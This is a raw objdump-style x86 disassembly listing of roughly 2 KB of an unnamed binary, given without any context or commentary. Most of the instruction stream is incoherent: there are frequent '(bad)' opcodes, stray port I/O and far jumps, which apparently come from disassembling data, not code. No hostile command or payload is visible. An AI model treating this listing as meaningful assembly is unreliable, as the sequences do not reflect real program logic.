  4183c6:	add    BYTE PTR [eax],al
  4183c8:	leave  
  4183c9:	(bad)  
  4183ca:	(bad)  
  4183cb:	dec    ecx
  4183cd:	push   es
  4183ce:	inc    eax
  4183cf:	and    BYTE PTR [ecx-0x26ffc03a],ch
  4183d5:	(bad)  
  4183d6:	(bad)  
  4183d7:	(bad)  
  4183d8:	mov    ecx,0xb9004006
  4183dd:	(bad)  
  4183de:	call   FWORD PTR [edi]
  4183e0:	cdq    
  4183e1:	push   es
  4183e2:	add    BYTE PTR [eax],al
  4183e4:	cdq    
  4183e5:	(bad)  
  4183e6:	aas    
  4183e7:	and    BYTE PTR [ecx+0x200006],cl
	...
  4183fd:	add    BYTE PTR [ecx-0x56ffbffa],bh
  418403:	(bad)  
  418404:	call   FWORD PTR [edi]
  418406:	cdq    
  418407:	push   es
  418408:	and    BYTE PTR [eax],al
  41840a:	mov    eax,DWORD PTR [esi]
  41840c:	and    BYTE PTR [eax+esi*8],al
  41840f:	ins    DWORD PTR es:[edi],dx
  418410:	stc    
  418411:	push   ebx
  418413:	outs   dx,DWORD PTR ds:[esi]
  418414:	add    DWORD PTR [eax],eax
  418416:	lock outs dx,DWORD PTR ds:[esi]
  418418:	stc    
  418419:	call   FWORD PTR [edi+0x6e]
  41841c:	stc    
  41841d:	push   ebx
  41841f:	ins    DWORD PTR es:[edi],dx
  418420:	stc    
  418421:	pop    ds
  418422:	lock outs dx,DWORD PTR ds:[esi]
  418424:	stc    
  418425:	pop    ds
  418426:	in     al,dx
  418427:	ins    DWORD PTR es:[edi],dx
  418428:	stc    
  418429:	pop    ds
  41842a:	hlt    
  41842b:	outs   dx,DWORD PTR ds:[esi]
  41842c:	add    DWORD PTR [eax],esp
  41842e:	lock outs dx,DWORD PTR ds:[esi]
  418430:	add    DWORD PTR [eax],eax
  418432:	lock ins DWORD PTR es:[edi],dx
  418434:	add    DWORD PTR [eax],eax
  418436:	in     al,dx
  418437:	ins    DWORD PTR es:[edi],dx
  418438:	add    DWORD PTR [eax],eax
  41843a:	lock outs dx,DWORD PTR ds:[esi]
  41843c:	add    DWORD PTR [eax],eax
  41843e:	in     al,dx
  41843f:	ins    DWORD PTR es:[edi],dx
  418440:	add    DWORD PTR [eax],esp
  418442:	hlt    
  418443:	ins    DWORD PTR es:[edi],dx
  418444:	stc    
  418445:	inc    DWORD PTR [edi]
  418447:	jo     0x418442
  418449:	push   ebx
  41844b:	ins    DWORD PTR es:[edi],dx
  41844c:	stc    
  41844d:	pop    ds
  41844e:	lock ins DWORD PTR es:[edi],dx
  418450:	add    DWORD PTR [eax],esp
  418452:	lock outs dx,DWORD PTR ds:[esi]
  418454:	stc    
  418455:	push   ebx
  418457:	ins    DWORD PTR es:[edi],dx
  418458:	add    DWORD PTR [eax],eax
  41845a:	hlt    
  41845b:	outs   dx,DWORD PTR ds:[esi]
  41845c:	add    DWORD PTR [eax],esp
  41845e:	in     al,dx
  41845f:	outs   dx,DWORD PTR ds:[esi]
  418460:	stc    
  418461:	pop    ds
	...
  418472:	add    BYTE PTR [eax],al
  418474:	hlt    
  418475:	ins    DWORD PTR es:[edi],dx
  418476:	add    DWORD PTR [eax],esp
  418478:	lock outs dx,DWORD PTR ds:[esi]
  41847a:	add    DWORD PTR [eax],esp
  41847c:	hlt    
  41847d:	outs   dx,DWORD PTR ds:[esi]
  41847e:	stc    
  41847f:	push   DWORD PTR [edi-0x50000693]
  418485:	ins    DWORD PTR es:[edi],dx
  418486:	stc    
  418487:	pop    ds
  418488:	in     al,dx
  418489:	outs   dx,DWORD PTR ds:[esi]
  41848a:	stc    
  41848b:	pop    ds
  41848c:	lock ins DWORD PTR es:[edi],dx
  41848e:	add    DWORD PTR [eax],eax
  418490:	lock outs dx,DWORD PTR ds:[esi]
  418492:	add    DWORD PTR [eax],eax
  418494:	hlt    
  418495:	outs   dx,DWORD PTR ds:[esi]
  418496:	stc    
  418497:	pop    ds
  418498:	lock push es
  41849a:	out    0x3,eax
  41849c:	lock or ah,bh
  41849f:	sti    
  4184a0:	xlat   BYTE PTR ds:[ebx]
  4184a1:	push   es
  4184a2:	out    0x3,eax
  4184a4:	adc    BYTE PTR [edi],al
  4184a6:	jmp    0xe946eca6
  4184ab:	sti    
  4184ac:	pop    edi
  4184ad:	add    eax,0xb1003e9
  4184b2:	jmp    0xe94c94ba
  4184b7:	add    esi,eax
  4184b9:	push   es
  4184ba:	jmp    0xe74894c2
  4184bf:	add    esi,eax
  4184c1:	or     ah,bh
  4184c3:	sti    
  4184c4:	das    
  4184c5:	add    eax,0x6d003e7
  4184ca:	out    0xfb,eax
  4184cc:	dec    DWORD PTR [edx]
  4184ce:	jmp    0xe9c29cce
  4184d3:	sti    
  4184d4:	out    dx,eax
  4184d5:	push   es
  4184d6:	out    0xfb,eax
	...
  4184e8:	add    BYTE PTR [eax],al
  4184ea:	out    0xa,eax
  4184ec:	jmp    0xe9c284ec
  4184f1:	add    esi,eax
  4184f3:	or     ch,cl
  4184f5:	sti    
  4184f6:	ud2    
  4184f8:	out    0x3,eax
  4184fa:	adc    BYTE PTR [ebx],cl
  4184fc:	out    0xfb,eax
  4184fe:	inc    DWORD PTR [esi]
  418500:	out    0x3,eax
  418502:	lock push es
  418504:	jmp    0xe948750c
  418509:	sti    
  41850a:	out    0xa,eax
  41850c:	out    0x3,eax
  41850e:	lock push es
  418510:	jmp    0xe7485d10
  418515:	add    edx,eax
  418517:	or     ah,bh
  418519:	sti    
  41851a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41851b:	sub    cl,0x3
  41851e:	lock or ah,bh
  418521:	sti    
  418522:	xchg   edi,eax
  418523:	add    al,0x0
  418525:	jmp    0xec3f05b5
  41852a:	repz add BYTE PTR es:[ecx],ch
  41852e:	test   BYTE PTR [eax-0x7f7c16f3],al
  418534:	std    
  418535:	jmp    0x2941902d
  41853a:	pop    esp
  41853b:	add    al,0x10
  41853d:	jmp    0x29518c35
  418542:	pop    esp
  418543:	or     BYTE PTR ds:0x6f429,0xe9
  41854a:	repz push es
  41854c:	adc    BYTE PTR [ecx+0x0],ch
	...
  41855e:	add    BYTE PTR [eax],al
  418560:	repz or al,BYTE PTR [eax]
  418563:	jmp    0xa951905b
  418568:	and    eax,DWORD PTR [eax+edx*1]
  41856b:	jmp    0xe9418993
  418570:	and    eax,DWORD PTR [eax+edx*1]
  418573:	test   eax,0xe9000423
  418578:	add    eax,DWORD PTR [eax+0x6f3a9fd]
  41857e:	add    cl,ch
  418580:	repz or dl,BYTE PTR [eax]
  418583:	test   eax,0xe91006f3
  418588:	jecxz  0x418609
  41858a:	or     eax,0xfd7fe3a9
  41858f:	jmp    0xa9418977
  418594:	repz or al,BYTE PTR [eax]
  418597:	test   eax,0xe9100af3
  41859c:	ret    
  41859d:	add    edx,DWORD PTR [eax]
  41859f:	sub    esp,eax
  4185a1:	jg     0x4185a0
  4185a3:	jmp    0xe9418c9b
  4185a8:	repz push es
  4185aa:	add    BYTE PTR [ecx],ch
  4185ac:	in     al,dx
  4185ad:	or     dl,BYTE PTR [eax]
  4185af:	add    cl,cl
  4185b1:	or     al,BYTE PTR [eax]
  4185b3:	adc    BYTE PTR [ecx-0x26f0028d],cl
  4185b9:	jp     0x4185bc
  4185bb:	add    BYTE PTR [ecx-0x36fffbfd],bl
  4185c1:	jp     0x4185c4
	...
  4185d3:	add    BYTE PTR [eax],al
  4185d5:	add    BYTE PTR [ecx+0x59000403],cl
  4185db:	jae    0x4185de
  4185dd:	adc    BYTE PTR [ecx+0x73],bl
  4185e0:	std    
  4185e1:	dec    DWORD PTR [ecx]
  4185e3:	or     eax,DWORD PTR [eax]
  4185e5:	add    BYTE PTR [ecx],cl
  4185e7:	or     eax,DWORD PTR [eax+edx*1]
  4185ea:	pop    ecx
  4185eb:	jae    0x4185ea
  4185ed:	call   FWORD PTR [ecx]
  4185ef:	jnp    0x4185f2
  4185f1:	add    BYTE PTR [ecx+0x73],cl
  4185f4:	std    
  4185f5:	jns    0x594185fe
  4185fb:	add    eax,DWORD PTR [eax]
  4185fd:	adc    BYTE PTR [ecx],bl
  4185ff:	add    eax,DWORD PTR [eax+edx*1]
  418602:	dec    ecx
  418603:	add    eax,DWORD PTR [eax+edx*1]
  418606:	or     DWORD PTR [ebx],eax
  418608:	add    BYTE PTR [eax],dl
  41860a:	sbb    DWORD PTR [ebx],eax
  41860c:	add    al,0x0
  41860e:	pop    ecx
  41860f:	jae    0x41860e
  418611:	wbinvd 
  418613:	add    eax,DWORD PTR [eax]
  418615:	add    BYTE PTR [ecx+0x73],cl
  418618:	add    DWORD PTR [eax],edx
  41861a:	cdq    
  41861b:	or     al,BYTE PTR [eax+eax*1]
  41861e:	cdq    
  41861f:	or     al,BYTE PTR [eax]
  418621:	adc    cl,cl
  418623:	or     al,BYTE PTR [eax+edx*1]
  418626:	leave  
  418627:	jp     0x418626
  418629:	setns  BYTE PTR [edx-0x3]
  41862d:	psubusw mm1,QWORD PTR [edx]
  418630:	add    BYTE PTR [eax],al
  418632:	or     DWORD PTR [ebx+0x1],esi
  418635:	adc    cl,cl
  418637:	jp     0x41863a
	...
  418649:	add    BYTE PTR [eax],al
  41864b:	add    al,dh
  41864d:	outs   dx,DWORD PTR ds:[esi]
  41864e:	icebp  
  41864f:	add    esi,eax
  418651:	das    
  418652:	hlt    
  418653:	call   FWORD PTR [edi-0x68000bd0]
  418659:	xor    BYTE PTR [esp+eax*1],al
  41865c:	lock outs dx,DWORD PTR ds:[esi]
  41865e:	add    DWORD PTR [eax],eax
  418660:	loopne 0x4186d1
  418662:	icebp  
  418663:	add    esp,eax
  418665:	outs   dx,DWORD PTR ds:[esi]
  418666:	sub    edi,edi
  418668:	ja     0x4186da
  41866a:	add    DWORD PTR [eax],eax
  41866c:	lock outs dx,DWORD PTR ds:[esi]
  41866e:	add    DWORD PTR [eax],eax
  418670:	lock fild QWORD PTR [ecx]
  418673:	call   FWORD PTR [edi-0xc]
  418676:	sub    bh,bh
  418678:	push   edi
  418679:	xchg   esp,eax
  41867a:	sub    al,0xff
  41867c:	dec    edi
  41867d:	jo     0x418680
  41867f:	add    al,dh
  418681:	outs   dx,DWORD PTR ds:[esi]
  418682:	add    DWORD PTR [eax],eax
  418684:	lock and DWORD PTR [edi],esp
  418687:	push   DWORD PTR [edi]
  418689:	push   eax
  41868a:	sub    edi,edi
  41868c:	das    
  41868d:	loopne 0x4186ba
  41868f:	jmp    DWORD PTR [edi]
  418691:	jo     0x418694
  418693:	add    al,dh
  418695:	outs   dx,DWORD PTR ds:[esi]
  418696:	add    DWORD PTR [eax],eax
  418698:	lock mov bh,0x28
  41869b:	dec    DWORD PTR [edi]
  41869d:	mov    ah,0x2b
  41869f:	inc    DWORD PTR [edi]
  4186a1:	cmp    BYTE PTR [edi+edi*8],ch
  4186a4:	jmp    FWORD PTR [edi+0x1]
  4186a7:	add    al,dh
  4186a9:	outs   dx,DWORD PTR ds:[esi]
  4186aa:	add    DWORD PTR [eax],eax
  4186ac:	lock adc esp,DWORD PTR [edi]
  4186af:	inc    DWORD PTR [eax]
	...
  4186c1:	add    bh,ah
  4186c3:	jecxz  0x4186f2
  4186c5:	(bad)  
  4186c6:	fisttp WORD PTR [ebx+0x2a]
  4186c9:	call   edi
  4186cb:	outs   dx,DWORD PTR ds:[esi]
  4186cc:	add    DWORD PTR [eax],eax
  4186ce:	lock outs dx,DWORD PTR ds:[esi]
  4186d0:	add    DWORD PTR [eax],eax
  4186d2:	lock pop ecx
  4186d4:	and    edi,edi
  4186d6:	mov    edi,0xb72d9706
  4186db:	jge    0x4186e8
  4186dd:	sub    ebp,DWORD PTR [edi-0xffc1883]
  4186e3:	push   es
  4186e4:	out    0x3,eax
  4186e6:	lock push es
  4186e8:	pop    ss
  4186e9:	and    al,0x97
  4186eb:	jge    0x41876c
  4186ed:	sub    eax,0x2aef7d8f
  4186f2:	xchg   DWORD PTR [ebp-0x19],edi
  4186f5:	add    esi,eax
  4186f7:	push   es
  4186f8:	out    0x3,eax
  4186fa:	lock push es
  4186fc:	dec    ecx
  4186fd:	and    ebp,DWORD PTR [edi+0x7d]
  418700:	stos   DWORD PTR es:[edi],eax
  418701:	sub    eax,0x2b337d67
  418706:	pop    edi
  418707:	jge    0x4186f0
  418709:	add    esi,eax
  41870b:	push   es
  41870c:	out    0x3,eax
  41870e:	lock push es
  418710:	leave  
  418711:	and    al,BYTE PTR [edi+0x7d]
  418714:	xchg   DWORD PTR ds:0x2a677d3f,ebp
  41871a:	aaa    
  41871b:	jge    0x418704
  41871d:	add    esi,eax
  41871f:	push   es
  418720:	out    0x3,eax
  418722:	lock push es
  418724:	mov    ch,0x22
	...
  418736:	add    BYTE PTR [eax],al
  418738:	pop    ds
  418739:	jge    0x41872e
  41873b:	sub    al,0x17
  41873d:	jge    0x418726
  41873f:	add    esi,eax
  418741:	push   es
  418742:	out    0x3,eax
  418744:	lock push es
  418746:	out    0x3,eax
  418748:	lock push es
  41874a:	out    0x3,eax
  41874c:	lock push es
  41874e:	out    0x3,eax
  418750:	lock push es
  418752:	out    dx,eax
  418753:	sub    al,0xe7
  418755:	jl     0x41871c
  418757:	sub    al,0xdf
  418759:	jl     0x418714
  41875b:	sub    al,0xd7
  41875d:	jl     0x418706
  41875f:	sub    al,0xcf
  418761:	jl     0x418763
  418763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418764:	adc    al,0x7c
  418766:	std    
  418767:	xchg   ecx,eax
  418768:	or     al,0x7c
  41876a:	std    
  41876b:	dec    edi
  41876c:	or     edi,DWORD PTR [ebp+edi*8+0x57]
  418770:	fstp   TBYTE PTR [ebx-0x3]
  418773:	imul   ebx,ebx,0x7b
  418776:	std    
  418777:	jns    0x418744
  418779:	jnp    0x418778
  41877b:	gs retf 
  41877d:	jnp    0x41877c
  41877f:	xchg   ecx,eax
  418780:	fstp   TBYTE PTR [ebx-0x3]
  418783:	ja     0x418760
  418785:	jnp    0x418784
  418787:	xchg   ebx,eax
  418788:	retf   
  418789:	jnp    0x418788
  41878b:	xchg   ecx,eax
  41878c:	retf   
  41878d:	jnp    0x41878c
  41878f:	lahf   
  418790:	sbb    edi,DWORD PTR [ebp+edi*8-0x19]
  418794:	(bad)  
  418796:	std    
  418797:	leave  
  418798:	pop    ss
  418799:	jl     0x418798
  41879b:	mov    ecx,0x0
	...
  4187ac:	add    BYTE PTR [eax],al
  4187ae:	(bad)  
  4187b0:	std    
  4187b1:	sub    ebx,DWORD PTR [eax]
  4187b3:	jl     0x4187b2
  4187b5:	sbb    ebx,DWORD PTR [eax]
  4187b7:	jl     0x4187b6
  4187b9:	pop    es
  4187ba:	or     BYTE PTR [ebp+edi*8-0x23],bh
  4187be:	(bad)  
  4187c0:	std    
  4187c1:	jno    0x41879b
  4187c3:	jnp    0x4187c2
  4187c5:	ja     0x41879f
  4187c7:	jnp    0x4187c6
  4187c9:	cdq    
  4187ca:	enter  0xfd7b,0x85
  4187ce:	enter  0xfd7b,0x2d
  4187d2:	fdivr  DWORD PTR [ebx-0x3]
  4187d5:	adc    eax,ebx
  4187d7:	jnp    0x4187d6
  4187d9:	cmp    eax,0x25fd7bc8
  4187de:	enter  0xfd7b,0xef
  4187e2:	sbb    BYTE PTR [ebp+edi*8-0x9],bh
  4187e6:	sbb    BYTE PTR [ebp+edi*8-0x29],bh
  4187ea:	or     BYTE PTR [ebp+edi*8+0x0],bh
  4187ee:	jnp    0x41881e
  4187f0:	std    
  4187f1:	jmp    DWORD PTR [ebx+0x2e]
  4187f4:	std    
  4187f5:	inc    DWORD PTR [edi+0x2f]
  4187f8:	std    
  4187f9:	jmp    DWORD PTR [ecx]
  4187fb:	cs std 
  4187fd:	call   FWORD PTR [ecx+0x2e]
  418800:	std    
  418801:	jmp    DWORD PTR [ecx+0x2e]
  418804:	std    
  418805:	jmp    DWORD PTR [ebp+0x2e]
  418808:	std    
  418809:	push   DWORD PTR [ebx-0x4c0002d2]
  41880f:	cs std 
  418811:	inc    DWORD PTR [eax]
	...
  418823:	add    BYTE PTR [ebx-0x5e0002df],bl
  418829:	and    ebp,edi
  41882b:	push   ecx
  41882d:	and    al,0xfd
  41882f:	inc    ebp
  418831:	and    al,0xfd
  418833:	jmp    DWORD PTR [edi]
  418835:	and    eax,0x24f5fffd
  41883a:	std    
  41883b:	inc    DWORD PTR ds:0xc5fffd25
  418841:	and    ebp,edi
  418843:	jmp    FWORD PTR [ebx+0x59fffd21]
  418849:	pop    es
  41884a:	add    BYTE PTR [eax],al
  41884c:	mov    cr7,ebp
  41884f:	push   edi
  418851:	and    ebp,edi
  418853:	(bad)  
  418854:	mov    edi,0xbffffd21
  418859:	and    ebp,edi
  41885b:	(bad)  
  41885c:	aas    
  41885d:	and    al,0xfd
  41885f:	(bad)  
  418860:	jmp    0x418885
  418862:	std    
  418863:	call   FWORD PTR [ecx]
  418865:	pop    es
  418866:	add    BYTE PTR [eax],al
  418868:	std    
  418869:	and    edi,ebp
  41886b:	dec    DWORD PTR [ecx]
  41886d:	pop    es
  41886e:	add    BYTE PTR [eax],al
  418870:	xor    eax,0x75fffd24
  418875:	and    ebp,edi
  418877:	push   eax
  418879:	xchg   edi,eax
  41887a:	es (bad) 
  41887c:	(bad)  
  41887e:	and    eax,0x25dcd7ff
  418883:	dec    edi
  418885:	les    esp,FWORD PTR ds:0xff
	...
  418897:	add    BYTE PTR [eax],al
  418899:	add    bh,al
  41889b:	cmp    al,0x26
  41889d:	(bad)  
  41889e:	mov    edi,0xb7ff2622
  4188a3:	mov    edx,0x4cafff23
  4188a8:	and    edi,edi
  4188aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ab:	jo     0x4188ae
  4188ad:	add    al,dh
  4188af:	gs and edi,edi
  4188b2:	xchg   edi,eax
  4188b3:	jo     0x4188b6
  4188b5:	add    al,dh
  4188b7:	add    DWORD PTR [edi+edi*8],esp
  4188ba:	xchg   DWORD PTR [esi+0x21],esi
  4188bd:	(bad)  
  4188be:	jg     0x418930
  4188c0:	add    DWORD PTR [eax],eax
  4188c2:	lock ret 
  4188c4:	and    edi,edi
  4188c6:	outs   dx,DWORD PTR ds:[esi]
  4188c7:	sbb    BYTE PTR [edi+edi*8],ah
  4188ca:	addr16 sbb al,0x24
  4188cd:	call   FWORD PTR [edi-0x10]
  4188d0:	and    edi,edi
  4188d2:	push   edi
  4188d3:	mul    BYTE PTR [ebx]
  4188d5:	dec    DWORD PTR [edi-0x2e]
  4188d8:	and    edi,edi
  4188da:	inc    edi
  4188db:	jo     0x4188de
  4188dd:	add    al,dh
  4188df:	cmp    DWORD PTR [edi+edi*8],esp
  4188e2:	aaa    
  4188e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188e4:	and    al,0xff
  4188e6:	das    
  4188e7:	ss and al,0xff
  4188ea:	daa    
  4188eb:	cmp    al,0x24
  4188ed:	call   FWORD PTR [edi]
  4188ef:	sub    ah,BYTE PTR [edi+edi*8]
  4188f2:	pop    ss
  4188f3:	aam    0x23
  4188f5:	dec    DWORD PTR [edi]
  4188f7:	xor    al,0x24
  4188f9:	inc    DWORD PTR [edi]
  4188fb:	xor    ah,BYTE PTR [edi+edi*8]
	...
  41890e:	add    BYTE PTR [eax],al
  418910:	jmp    DWORD PTR [ecx+0x22]
  418913:	push   edi
  418915:	push   es
  418916:	sti    
  418917:	and    ch,bh
  418919:	jns    0x418902
  41891b:	add    esi,eax
  41891d:	push   es
  41891e:	lds    esp,FWORD PTR [edx]
  418920:	fistp  QWORD PTR [ecx-0x57]
  418923:	and    dl,bh
  418925:	jns    0x41890e
  418927:	add    esi,eax
  418929:	push   es
  41892a:	fild   QWORD PTR [eax]
  41892c:	(bad)  
  41892d:	jns    0x4188fc
  41892f:	sub    BYTE PTR [edi-0x48d74687],bh
  418935:	jns    0x41895e
  418937:	sub    DWORD PTR [edi-0x58d6d487],ebp
  41893d:	jns    0x41896e
  41893f:	sub    DWORD PTR [edi-0x68d6ba87],ebx
  418945:	jns    0x418984
  418947:	sub    DWORD PTR [edi-0x78d79687],ecx
  41894d:	jns    0x4189a6
  41894f:	sub    BYTE PTR [edi+0x79],bh
  418952:	dec    ebx
  418953:	sub    BYTE PTR [edi+0x79],dh
  418956:	dec    edi
  418957:	sub    BYTE PTR [edi+0x79],ch
  41895a:	pop    ebp
  41895b:	sub    BYTE PTR [edi+0x79],ah
  41895e:	mov    cl,0x28
  418960:	pop    edi
  418961:	jns    0x4189e2
  418963:	sub    BYTE PTR [edi+0x79],dl
  418966:	test   DWORD PTR [eax],ebp
  418968:	dec    edi
  418969:	jns    0x418958
  41896b:	daa    
  41896c:	inc    edi
  41896d:	jns    0x418936
  41896f:	daa    
  418970:	aas    
  418971:	jns    0x41892a
  418973:	daa    
	...
  418984:	add    BYTE PTR [eax],al
  418986:	aaa    
  418987:	jns    0x418932
  418989:	daa    
  41898a:	das    
  41898b:	jns    0x418946
  41898d:	daa    
  41898e:	daa    
  41898f:	jns    0x41895e
  418991:	daa    
  418992:	pop    ds
  418993:	jns    0x418968
  418995:	daa    
  418996:	pop    ss
  418997:	jns    0x418a08
  418999:	daa    
  41899a:	vmwrite ebx,DWORD PTR [ebp+0x27]
  41899e:	pop    es
  41899f:	jns    0x4189a1
  4189a1:	jns    0x41897a
  4189a3:	jns    0x4189a2
  4189a5:	ins    DWORD PTR es:[edi],dx
  4189a6:	iret   
  4189a7:	jns    0x4189a6
  4189a9:	xor    eax,0x41fd7817
  4189ae:	vmread ebp,edi
  4189b1:	add    eax,0xdfd7817
  4189b6:	vmread ebp,edi
  4189b9:	not    DWORD PTR [esi]
  4189bb:	js     0x4189ba
  4189bd:	fisttp WORD PTR [esi]
  4189bf:	js     0x4189be
  4189c1:	mov    edi,0x9bfd7816
  4189c6:	push   cs
  4189c7:	js     0x4189c6
  4189c9:	push   ebx
  4189ca:	xchg   ecx,eax
  4189cb:	jns    0x4189ca
  4189cd:	push   edi
  4189ce:	xchg   ecx,eax
  4189cf:	jns    0x4189ce
  4189d1:	jno    0x418964
  4189d3:	jns    0x4189d2
  4189d5:	cdq    
  4189d6:	xchg   ecx,eax
  4189d7:	jns    0x4189d6
  4189d9:	mov    cl,0x91
  4189db:	jns    0x4189da
  4189dd:	xchg   ebp,eax
  4189de:	xchg   ecx,eax
  4189df:	jns    0x4189de
  4189e1:	ret    
  4189e2:	xchg   ecx,eax
  4189e3:	jns    0x4189e2
  4189e5:	mov    bl,0x91
  4189e7:	jns    0x4189e6
  4189e9:	jmp    0x4189eb
	...
  4189fb:	add    BYTE PTR [ecx+0x79],dl
  4189fe:	std    
  4189ff:	add    DWORD PTR [edx+0x79],edx
  418a02:	std    
  418a03:	rcl    DWORD PTR [ecx+0x79],0xfd
  418a07:	and    eax,0x1ffd7952
  418a0c:	push   edx
  418a0d:	jns    0x418a0c
  418a0f:	add    eax,0xfdfd7952
  418a14:	push   ecx
  418a15:	jns    0x418a14
  418a17:	gs push edx
  418a19:	jns    0x418a18
  418a1b:	jnp    0x418a2f
  418a1d:	jns    0x418a1c
  418a1f:	jmp    0x97419117
  418a24:	adc    bh,BYTE PTR [ecx-0x3]
  418a27:	aaa    
  418a28:	adc    bh,BYTE PTR [ecx-0x3]
  418a2b:	add    BYTE PTR [edi-0x3800019c],ah
  418a31:	fs (bad) 
  418a33:	call   DWORD PTR [edi]
  418a35:	gs (bad) 
  418a37:	(bad)  
  418a38:	jmp    0x418a9d
  418a3a:	(bad)  
  418a3b:	(bad)  
  418a3c:	fld    DWORD PTR [ebx]
  418a3e:	add    BYTE PTR [eax],al
  418a40:	lds    esp,FWORD PTR [esi+edi*8-0x1]
  418a44:	leave  
  418a45:	add    eax,DWORD PTR [eax]
  418a47:	add    BYTE PTR [ebp+0x7dfffe64],bl
  418a4d:	fs (bad) 
  418a4f:	push   DWORD PTR [ecx+0x64]
  418a52:	(bad)  
  418a53:	dec    DWORD PTR [edi+0x64]
  418a56:	(bad)  
  418a57:	call   FWORD PTR ds:0x7dfffe64
  418a5d:	fs (bad) 
  418a5f:	inc    DWORD PTR [eax]
	...
  418a71:	add    BYTE PTR [ebp+0x64],bh
  418a74:	(bad)  
  418a75:	dec    DWORD PTR [edi+0x64]
  418a78:	(bad)  
  418a79:	call   FWORD PTR [edi+0x64]
  418a7c:	(bad)  
  418a7d:	jmp    DWORD PTR [ebp-0x6600019c]
  418a83:	add    eax,DWORD PTR [eax]
  418a85:	add    BYTE PTR [ebx-0x7600019d],dl
  418a8b:	add    eax,DWORD PTR [eax]
  418a8d:	add    BYTE PTR [edi],bh
  418a8f:	arpl   si,di
  418a91:	call   DWORD PTR [ebx+0x63]
  418a94:	(bad)  
  418a95:	dec    DWORD PTR [ecx+0x3]
  418a98:	add    BYTE PTR [eax],al
  418a9a:	add    eax,0xe1fffe63
  418a9f:	(bad)  
  418aa0:	(bad)  
  418aa1:	(bad)  
  418aa2:	cmp    eax,0xc9fffe63
  418aa7:	arpl   si,di
  418aa9:	call   ebx
  418aab:	arpl   si,di
  418aad:	jmp    FWORD PTR [edi+0x19fffe63]
  418ab3:	add    eax,DWORD PTR [eax]
  418ab5:	add    al,dh
  418ab7:	jg     0x418a9a
  418ab9:	(bad)  
  418aba:	pop    ss
  418abb:	xchg   ebx,eax
  418abc:	loope  0x418abc
  418abe:	rdpmc  
  418ac0:	loope  0x418ac0
  418ac2:	pop    es
  418ac3:	adc    ecx,esp
  418ac5:	(bad)  
  418ac6:	dec    DWORD PTR [esi]
  418ac8:	loope  0x418ac8
  418aca:	idiv   DWORD PTR [eax]
  418acc:	loope  0x418acc
  418ace:	out    dx,eax
  418acf:	adc    al,0xe1
  418ad1:	(bad)  
  418ad2:	out    0x16,eax
  418ad4:	loope  0x418ad4
	...
  418ae6:	add    BYTE PTR [eax],al
  418ae8:	fbld   TBYTE PTR [esi-0x1c]
  418aeb:	(bad)  
  418aec:	xlat   BYTE PTR ds:[ebx]
  418aed:	jl     0x418ad3
  418aef:	dec    bh
  418af1:	pusha  
  418af2:	add    DWORD PTR [eax],eax
  418af4:	lock inc ebp
  418af6:	in     al,0xfe
  418af8:	mov    edi,0xb7fee4a2
  418afd:	pusha  
  418afe:	add    DWORD PTR [eax],eax
  418b00:	lock sub al,BYTE PTR [ecx+eax*2]
  418b04:	and    cl,bl
  418b06:	loopne 0x418b7b
  418b08:	adc    eax,0xd6be926
  418b0d:	pop    ds
  418b0e:	add    al,0x3f
  418b10:	repnz adc ebp,esp
  418b13:	pop    esi
  418b14:	or     al,0x2e
  418b16:	jmp    0x1a1a086
  418b1b:	and    eax,esi
  418b1d:	and    al,dh
  418b1f:	ins    BYTE PTR es:[edi],dx
  418b20:	jecxz  0x418b24
  418b22:	int3   
  418b23:	pop    esi
  418b24:	(bad)  
  418b25:	or     esi,eax
  418b27:	(bad)  
  418b28:	lock cwde 
  418b2a:	push   es
  418b2b:	push   ebp
  418b2c:	loop   0x418b34
  418b2e:	clc    
  418b2f:	bound  esi,QWORD PTR [esi-0xf9d0fea]
  418b35:	push   edx
  418b36:	add    al,0x6c
  418b38:	ret    
  418b39:	jae    0x418b2e
  418b3b:	imul   ecx,ebp,0x75
  418b3e:	ret    0x2fff
  418b41:	pop    es
  418b42:	xchg   edi,eax
  418b43:	add    ebp,DWORD PTR [ebp-0x411a321e]
  418b49:	loop   0x418aed
  418b4b:	lock add BYTE PTR [eax],al
	...
  418b5e:	nop
  418b5f:	loope  0x418b47
  418b61:	add    eax,DWORD PTR [ebp+0x8]
  418b64:	scas   al,BYTE PTR es:[edi]
  418b65:	out    dx,eax
  418b66:	xchg   esp,eax
  418b67:	call   0xe4e47b33
  418b6c:	ret    0x90f0
  418b6f:	loope  0x418b57
  418b71:	add    esp,esp
  418b73:	pop    es
  418b74:	mov    bl,0xf0
  418b76:	push   eax
  418b77:	call   0xeca35506
  418b7c:	mov    eax,DWORD PTR [ebx]
  418b7e:	loopne 0x418b87
  418b80:	fwait
  418b81:	lock push eax
  418b83:	call   0xe39d4e1a
  418b88:	(bad)  
  418b89:	in     al,0xbf
  418b8b:	jne    0x418b5d
  418b8d:	add    al,0x44
  418b8f:	cli    
  418b90:	jb     0x418b87
  418b92:	adc    bh,dh
  418b94:	pop    edi
  418b95:	ret    
  418b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b97:	jne    0x418b93
  418b99:	add    al,0xc
  418b9b:	cli    
  418b9c:	pop    edx
  418b9d:	not    BYTE PTR [eax]
  418b9f:	call   0x75d14ef6
  418ba4:	fiadd  WORD PTR [edx]
  418ba6:	sub    eax,0x16ca32ec
  418bab:	jecxz  0x418bf8
  418bad:	ret    
  418bae:	add    edi,ebx
  418bb0:	cmp    bl,ch
  418bb2:	sar    ebx,1
  418bb4:	sbb    ah,bh
  418bb6:	loopne 0x418b7f
  418bb8:	out    0x3,al
  418bba:	jnp    0x418bc2
  418bbc:	sub    al,0xfc
  418bbe:	(bad)  
  418bbf:	out    0xfc,eax
  418bc1:	out    0x0,eax
	...
  418bd3:	add    BYTE PTR [edx-0x3e15031c],dh
  418bd9:	in     eax,0xc
  418bdb:	out    dx,eax
  418bdc:	shl    ah,cl
  418bde:	(bad)  
  418bdf:	cld    
  418be0:	sbb    al,0xf9
  418be2:	jno    0x418be4
  418be4:	and    ch,dl
  418be6:	jo     0x418b90
  418be8:	repz adc bh,bh
  418beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bec:	push   ss
  418bed:	stc    
  418bee:	inc    ebp
  418bef:	rol    BYTE PTR [edi],0xe8
  418bf2:	push   eax
  418bf3:	ror    BYTE PTR ds:0xec06ffe8,0xc7
  418bfa:	jno    0x418bc0
